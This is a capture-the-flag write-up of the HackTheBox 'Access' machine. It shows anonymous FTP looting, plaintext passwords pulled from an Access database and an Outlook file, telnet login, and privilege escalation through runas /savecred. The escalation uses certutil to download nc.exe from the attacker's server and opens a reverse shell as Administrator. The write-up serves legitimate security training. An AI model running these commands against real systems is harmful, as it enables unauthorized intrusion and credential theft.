---
layout: post
title: HTB Access Writeup
date: 2026-03-28 21:48 -0400
categories: [Writeups, HackTheBox]
tags: [ctf]
--- 

## Initial Enumeration
``` shell - Attacker (Bash)
$ sudo nmap -sC -sV -vv --top-ports=5000 $TARGETIP -oN nmapout
```

``` shell - Attacker (Bash)
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet  syn-ack ttl 127 Microsoft Windows XP telnetd
| telnet-ntlm-info: 
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
```

## Service Enumeration

### FTP
FTP is found to be open to anonymous access (anonymous / anypasswordcanbeused). 
``` shell - Attacker (Bash)
$ ftp $TARGETIP
```

Within the FTP service, two folders are available with a single file in each.
``` shell - Attacker (Bash)
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> ls Backups
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> ls Engineer
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  01:16AM                10870 Access Control.zip
226 Transfer complete.
```

### Telnet
Telnet is available, but we don't currently have any credentials to allow access.

### HTTP
Navigating to the web application on port 80, we can see a still image
![alt text](/assets/img/HTBWriteupScreenshots/ACCESS_WEB_1.png)

## File Investgation

Let's download the files we found earlier on the FTP server. To ensure the file is not corrupted during the download, we can use the **binary on** command within FTP.

``` shell - Attacker (Bash)
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> binary on
200 Type set to I.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 PORT command successful.
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************************************************************|  5520 KiB    3.58 MiB/s    00:00 ETA
226 Transfer complete.
5652480 bytes received in 00:01 (3.58 MiB/s)
ftp> cd /Engineer
250 CWD command successful.
ftp> mget *
mget Access Control.zip [anpqy?]? y
200 PORT command successful.
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************************************************************| 10870       76.00 KiB/s    00:00 ETA
226 Transfer complete.
10870 bytes received in 00:00 (75.89 KiB/s)
```

Attempting to unzip the Access Control.zip file with the standard unzip command fails:
``` shell - Attacker (Bash)
$ unzip Access\ Control.zip 
Archive:  Access Control.zip
   skipping: Access Control.pst      unsupported compression method 99
```

Using the 7z tool, it is revealed that the zip archive is password protected:
``` shell - Attacker (Bash)
$ 7z e Access\ Control.zip 

7-Zip 26.00 (x64) : Copyright (c) 1999-2026 Igor Pavlov : 2026-02-12
 64-bit locale=en_US.UTF-8 Threads:12 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870

    
Enter password (will not be echoed):
```

Since we don't have any passwords currently, let's pivot to the *backup.mdb* file. Being unfamiliar with the extension, we investigate what file type this is:
``` shell - Attacker (Bash)
$ file backup.mdb          
backup.mdb: Microsoft Access Database
```

With a quick search, we find that with the [mdbtools](https://www.kali.org/tools/mdbtools/) suite, these files can be read. Using some bash magic, we can dump all the tables into JSON output:

``` shell - Attacker (Bash)
$ for line in $(mdb-tables backup.mdb -1); do echo "TABLE: ${line}" ; mdb-json backup.mdb $line; done
```

Parsing through the output, we find credentials for an admin user:
``` shell - Attacker (Bash)
TABLE: auth_user
{"id":25,"username":"admin","password":"admin","Status":1,"last_login":"08/23/18 21:11:47","RoleID":26}
{"id":27,"username":"engineer","password":"access4u@security","Status":1,"last_login":"08/23/18 21:13:36","RoleID":26}
{"id":28,"username":"backup_admin","password":"admin","Status":1,"last_login":"08/23/18 21:14:02","RoleID":26}
```

Since we found the *Access Control.zip* file within the Engineer folder, let's try the password for the engineer user to decrypt the file.

``` shell - Attacker (Bash)
Enter password (will not be echoed):
Everything is Ok

Size:       271360
Compressed: 10870
```

This was successful, leaving us with a single file *Access Control.pst*.
``` shell - Attacker (Bash)
$ file Access\ Control.pst 
Access Control.pst: Microsoft Outlook Personal Storage (>=2003, Unicode, version 23), dwReserved1=0x234, dwReserved2=0x22f3a, bidUnused=0000000000000000, dwUnique=0x39, 271360 bytes, bCryptMethod=1, CRC32 0x744a1e2e
```

From Microsoft's documentation we can see this file type can contain various outlook information:
> [Microsoft Documentation](https://support.microsoft.com/en-us/office/open-and-find-items-in-an-outlook-data-file-pst-2e2b55a4-f681-4b93-90cb-31d39349fb95)
>
> *Outlook Data Files (.pst), or Personal Storage Tables files, contain Outlook user messages and other Outlook items, such as contacts, appointments, tasks, notes, and journal entries. You might also use an Outlook data file to backup messages or store older items locally on your computer to keep the size of your mailbox small.*
{: .prompt-info }

This file can be read with the [pst-utils](https://www.kali.org/tools/mdbtools/) tool suite. We will use the **readpst** tool specifically.
``` shell - Attacker (Bash)
$ readpst Access\ Control.pst 
Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.
```

This results in a file created with the .mbox extension, which is text based and can be read easily in the CLI.
``` shell - Attacker (Bash)
$ cat Access\ Control.mbox 
From "john@megacorp.com" Thu Aug 23 19:44:07 2018
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
----SNIP----
```

Inside the email body, we see the following:
```
The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
```

## Telnet Access

With our credentials for the security account, we can now attempt to authenticate to the telnet service.

``` shell - Attacker (Bash)
$ telnet $TARGETIP         
Trying $TARGETIP...
Connected to $TARGETIP.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>
```

We have now logged into the machine succesfully. We are then able to navigate to the Desktop of the security user, and retrieve our **user.txt** flag.
``` shell - Target
C:\Users\security>cd Desktop

C:\Users\security\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\security\Desktop

08/28/2018  07:51 AM    <DIR>          .
08/28/2018  07:51 AM    <DIR>          ..
03/29/2026  06:13 PM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,346,685,952 bytes free
```

## Escalation to Admin

Navigating back a directory, we are able to see what other users are present on the machine.
``` shell - Target
C:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users

08/21/2018  11:31 PM    <DIR>          .
08/21/2018  11:31 PM    <DIR>          ..
08/24/2018  12:46 AM    <DIR>          Administrator
07/14/2009  05:57 AM    <DIR>          Public
08/23/2018  11:52 PM    <DIR>          security
               0 File(s)              0 bytes
               5 Dir(s)   3,346,685,952 bytes free
```

With no other users besides the Administrator, we can investigate if any files are available in the Public folder. We can use the */a* flag to show any hidden files.
``` shell - Target (CMD) Telnet
C:\Users\Public>dir /a
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\Public

07/14/2009  05:57 AM    <DIR>          .
07/14/2009  05:57 AM    <DIR>          ..
08/28/2018  07:51 AM    <DIR>          Desktop
07/14/2009  05:57 AM               174 desktop.ini
07/14/2009  06:06 AM    <DIR>          Documents
07/14/2009  05:57 AM    <DIR>          Downloads
07/14/2009  03:34 AM    <DIR>          Favorites
07/14/2009  05:57 AM    <DIR>          Libraries
07/14/2009  05:57 AM    <DIR>          Music
07/14/2009  05:57 AM    <DIR>          Pictures
07/14/2009  05:57 AM    <DIR>          Videos
               1 File(s)            174 bytes
              10 Dir(s)   3,346,685,952 bytes free
```

It seems like the Desktop folder is the only one with a more recent modification date, so we will dive deeper there.
``` shell - Target (CMD) Telnet
C:\Users\Public\Desktop>dir /a
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\Public\Desktop

08/28/2018  07:51 AM    <DIR>          .
08/28/2018  07:51 AM    <DIR>          ..
07/14/2009  05:57 AM               174 desktop.ini
08/22/2018  10:18 PM             1,870 ZKAccess3.5 Security System.lnk
               2 File(s)          2,044 bytes
               2 Dir(s)   3,346,685,952 bytes free
```

A link is found, to see what exactly it is doing, we can just print the .lnk contents with **type**:
``` shell - Target (CMD) Telnet
C:\Users\Public\Desktop>type "ZKAccess3.5 Security System.lnk"
L�F�@ ��7���7���#�P/P�O� �:i�+00�/C:\R1M�:Windows���:�▒M�:*wWindowsV1MV�System32���:�▒MV�*�System32▒X2P�:�
                                                                                                           runas.exe���:1��:1�*Yrunas.exe▒L-K��E�C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%�
                                                                                                                                                                                                                   �wN�▒�]N�D.��Q���`�Xaccess�_���8{E�3
           O�j)�H���
                    )ΰ[�_���8{E�3
                                 O�j)�H���
                                          )ΰ[�  ��1SPS��XF�L8C���&�m�e*S-1-5-21-953262931-566350628-63446256-500
```

While we *can* just attempt to parse the readable information from this binary file type, tool suites such as **liblnk-utils** will allow us to better interpret this shortcut file:
``` shell - Attacker (Bash)
$ sudo apt install liblnk-utils -y
```

We will also need to get this file onto our attacker machine. Since we are limited to CMD currently, we can use the **certutil** command to encode the file to base64, and do a simple copy and paste.
``` shell - Target (CMD) Telnet
C:\Users\Public\Desktop>certutil -encode "ZKAccess3.5 Security System.lnk" C:\Users\security\output.txt && type C:\Users\security\output.txt
Input Length = 1870
Output Length = 2630
CertUtil: -encode command completed successfully.
-----BEGIN CERTIFICATE-----
TAAAAAEUAgAAAAAAwAAAAAAAAEb7QAAAIAAAAPV/wTcRBMoB9X/BNxEEygGg0wjv
IwTKAQBQAAAAAAAAAQAAAAAAAAAAAAAAAAAAAC8BFAAfUOBP0CDqOmkQotgIACsw
MJ0ZAC9DOlwAAAAAAAAAAAAAAAAAAAAAAAAAUgAxAAAAAAAWTec6EABXaW5kb3dz
ADwACAAEAO++7jqFGhZN5zoqAAAAdwEAAAAAAQAAAAAAAAAAAAAAAAAAAFcAaQBu
AGQAbwB3AHMAAAAWAFYAMQAAAAAAFk1WoxAAU3lzdGVtMzIAAD4ACAAEAO++7jqG
GhZNVqMqAAAAxAUAAAAAAQAAAAAAAAAAAAAAAAAAAFMAeQBzAHQAZQBtADMAMgAA
ABgAWAAyAABQAADuOvAMIABydW5hcy5leGUAQAAIAAQA777tOjG77ToxuyoAAAAD
WQAAAAABAAAAAAAAAAAAAAAAAAAAcgB1AG4AYQBzAC4AZQB4AGUAAAAYAAAATAAA
ABwAAAABAAAAHAAAAC0AAAAAAAAASwAAABEAAAADAAAA8NtFnBAAAAAAQzpcV2lu
ZG93c1xTeXN0ZW0zMlxydW5hcy5leGUAACMALgAuAFwALgAuAFwALgAuAFwAVwBp
AG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAHIAdQBuAGEAcwAuAGUAeABl
ABUAQwA6AFwAWgBLAFQAZQBjAG8AXABaAEsAQQBjAGMAZQBzAHMAMwAuADUARwAv
AHUAcwBlAHIAOgBBAEMAQwBFAFMAUwBcAEEAZABtAGkAbgBpAHMAdAByAGEAdABv
AHIAIAAvAHMAYQB2AGUAYwByAGUAZAAgACIAQwA6AFwAWgBLAFQAZQBjAG8AXABa
AEsAQQBjAGMAZQBzAHMAMwAuADUAXABBAGMAYwBlAHMAcwAuAGUAeABlACIAJwBD
ADoAXABaAEsAVABlAGMAbwBcAFoASwBBAGMAYwBlAHMAcwAzAC4ANQBcAGkAbQBn
AFwAQQBjAGMAZQBzAHMATgBFAFQALgBpAGMAbwAUAwAABwAAoCVTeXN0ZW1Ecml2
ZSVcWktUZWNvXFpLQWNjZXNzMy41XGltZ1xBY2Nlc3NORVQuaWNvAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAJQBTAHkAcwB0AGUAbQBEAHIAaQB2AGUAJQBcAFoASwBUAGUAYwBv
AFwAWgBLAEEAYwBjAGUAcwBzADMALgA1AFwAaQBtAGcAXABBAGMAYwBlAHMAcwBO
AEUAVAAuAGkAYwBvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ABAAAAAFAACgJQAAANUAAAAcAAAACwAAoHdOwRrnAl1Ot0Qusa5RmLfVAAAAYAAA
AAMAAKBYAAAAAAAAAGFjY2VzcwAAAAAAAAAAAADyX+X4oTh7RZkzABkLT+FqFymM
f0im6BGJFQAMKc6wW/Jf5fihOHtFmTMAGQtP4WoXKYx/SKboEYkVAAwpzrBbjQAA
AAkAAKCBAAAAMVNQU+KKWEa8TDhDu/wTkyaYbc5lAAAABAAAAAAfAAAAKgAAAFMA
LQAxAC0ANQAtADIAMQAtADkANQAzADIANgAyADkAMwAxAC0ANQA2ADYAMwA1ADAA
NgAyADgALQA2ADMANAA0ADYAMgA1ADYALQA1ADAAMAAAAAAAAAAAAAAAAAAAAA==
-----END CERTIFICATE-----
```

This can then be converted back to the .lnk file on our attacker machine, after removing the BEGIN and END certificate lines:
``` shell - Attacker (Bash)
$ echo -n 'TAAAAAEUAgAAAAAAwAAAAAAAAEb7QAAAIAAAAPV/wTcRBMoB9X/BNxEEygGg0wjv
IwTKAQBQAAAAAAAAAQAAAAAAAAAAAAAAAAAAAC8BFAAfUOBP0CDqOmkQotgIACsw
MJ0ZAC9DOlwAAAAAAAAAAAAAAAAAAAAAAAAAUgAxAAAAAAAWTec6EABXaW5kb3dz
ADwACAAEAO++7jqFGhZN5zoqAAAAdwEAAAAAAQAAAAAAAAAAAAAAAAAAAFcAaQBu
AGQAbwB3AHMAAAAWAFYAMQAAAAAAFk1WoxAAU3lzdGVtMzIAAD4ACAAEAO++7jqG
GhZNVqMqAAAAxAUAAAAAAQAAAAAAAAAAAAAAAAAAAFMAeQBzAHQAZQBtADMAMgAA
ABgAWAAyAABQAADuOvAMIABydW5hcy5leGUAQAAIAAQA777tOjG77ToxuyoAAAAD
WQAAAAABAAAAAAAAAAAAAAAAAAAAcgB1AG4AYQBzAC4AZQB4AGUAAAAYAAAATAAA
ABwAAAABAAAAHAAAAC0AAAAAAAAASwAAABEAAAADAAAA8NtFnBAAAAAAQzpcV2lu
ZG93c1xTeXN0ZW0zMlxydW5hcy5leGUAACMALgAuAFwALgAuAFwALgAuAFwAVwBp
AG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAHIAdQBuAGEAcwAuAGUAeABl
ABUAQwA6AFwAWgBLAFQAZQBjAG8AXABaAEsAQQBjAGMAZQBzAHMAMwAuADUARwAv
AHUAcwBlAHIAOgBBAEMAQwBFAFMAUwBcAEEAZABtAGkAbgBpAHMAdAByAGEAdABv
AHIAIAAvAHMAYQB2AGUAYwByAGUAZAAgACIAQwA6AFwAWgBLAFQAZQBjAG8AXABa
AEsAQQBjAGMAZQBzAHMAMwAuADUAXABBAGMAYwBlAHMAcwAuAGUAeABlACIAJwBD
ADoAXABaAEsAVABlAGMAbwBcAFoASwBBAGMAYwBlAHMAcwAzAC4ANQBcAGkAbQBn
AFwAQQBjAGMAZQBzAHMATgBFAFQALgBpAGMAbwAUAwAABwAAoCVTeXN0ZW1Ecml2
ZSVcWktUZWNvXFpLQWNjZXNzMy41XGltZ1xBY2Nlc3NORVQuaWNvAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAJQBTAHkAcwB0AGUAbQBEAHIAaQB2AGUAJQBcAFoASwBUAGUAYwBv
AFwAWgBLAEEAYwBjAGUAcwBzADMALgA1AFwAaQBtAGcAXABBAGMAYwBlAHMAcwBO
AEUAVAAuAGkAYwBvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ABAAAAAFAACgJQAAANUAAAAcAAAACwAAoHdOwRrnAl1Ot0Qusa5RmLfVAAAAYAAA
AAMAAKBYAAAAAAAAAGFjY2VzcwAAAAAAAAAAAADyX+X4oTh7RZkzABkLT+FqFymM
f0im6BGJFQAMKc6wW/Jf5fihOHtFmTMAGQtP4WoXKYx/SKboEYkVAAwpzrBbjQAA
AAkAAKCBAAAAMVNQU+KKWEa8TDhDu/wTkyaYbc5lAAAABAAAAAAfAAAAKgAAAFMA
LQAxAC0ANQAtADIAMQAtADkANQAzADIANgAyADkAMwAxAC0ANQA2ADYAMwA1ADAA
NgAyADgALQA2ADMANAA0ADYAMgA1ADYALQA1ADAAMAAAAAAAAAAAAAAAAAAAAA==' | base64 -d > outlink.lnk
```

It can now be analyzed with the **lnkinfo** command:
``` shell - Attacker (Bash)
$ lnkinfo outlink.lnk 
```

It contains quite a bit of output, but the Command line arguments are what we want to see specifically:
``` shell - Attacker (Bash)
Command line arguments          : /user:ACCESS\\Administrator /savecred "C:\\ZKTeco\\ZKAccess3.5\\Access.exe"
```

It is revealed that the **runas** command was used as the **Administrator** user with the **/savecred** option. This means the Administrator password is saved in the Windows Credential Manager, allowing for the command to be run without having to re-enter the password. We can verify the credential still exists on the machine with the **cmdkey** command:
``` shell - Target
C:\Users\Public\Desktop>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator

```

With confirmation the credential is indeed present, we can now leverage this to create a reverse shell to our attacker machine as the Administrator by leveraging the same option in a malicious runas command.

We will download a Netcat executable to the machine, and create a reverse shell using the **-e** flag. First we have to get our hands on the **nc.exe**:
``` shell - Attacker (Bash)
$ git clone https://github.com/int0x33/nc.exe/ && cd nc.exe
```

We then need to serve this file to the machine, which can be done by setting up a simple python HTTP server, and leveraging the **certutil** command again:
``` shell - Attacker (Bash)
$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

In our telnet session:
``` shell - Target (CMD) Telnet
C:\Users\security> certutil -urlcache -split -f http://$ATTACKERIP/nc.exe C:\Users\security\nc.exe
```

Now finally, we can setup the reverse shell listener:
``` shell - Attacker (Bash)
$ nc -lvnp 8888
listening on [any] 8888 ...
```

And create the connection back to our attacker machine:
``` shell - Target (CMD) Telnet
C:\Users\security>C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Users\security\nc.exe $ATTACKERIP 8888 -e cmd"
```

We quickly receive a connection on our listener:
``` shell - Attacker (Bash) - Netcat
connect to [$ATTACKERIP] from (UNKNOWN) [$TARGETIP] 49170
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
access\administrator
```

We can now navigate to the Administrator's desktop and retrieve our **root.txt** flag:
``` shell - Attacker (Bash) - Netcat
C:\Windows\system32>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir 
dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\Administrator\Desktop

07/14/2021  03:40 PM    <DIR>          .
07/14/2021  03:40 PM    <DIR>          ..
03/29/2026  06:13 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,346,378,752 bytes free
```